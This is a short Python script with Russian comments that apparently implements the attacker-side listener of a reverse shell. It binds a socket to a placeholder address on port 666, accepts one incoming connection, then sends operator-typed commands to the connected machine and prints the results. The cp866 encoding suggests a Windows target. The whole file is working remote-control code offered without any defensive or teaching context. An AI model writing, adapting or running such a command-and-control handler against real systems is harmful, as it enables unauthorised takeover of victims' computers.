#!/usr/bin/env python 
import socket


class Server:

	def __init__(self, ip: str, port: int):

		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 	# инициализация сокета
		server.bind((ip, port))		# привязка к сокету ип и порт тачки
		server.listen(0)			# прослушивание входящих соединений

		print("[+] Waiting for incoming connections")
		self.connection, address = server.accept()
		print(f"[+] Got a connection from {address}")

	def execute_remotely(self, command):
		self.connection.send(command)
		return self.connection.recv(1024)

	def run_server(self):
		while True:
			command = bytes(input(">> ").encode('cp866'))
			result = self.execute_remotely(command)
			print(result.decode('cp866').strip())


def main():
	server_listener = Server("linux_ip", 666)
	server_listener.run_server()


if __name__ == "__main__":
	main()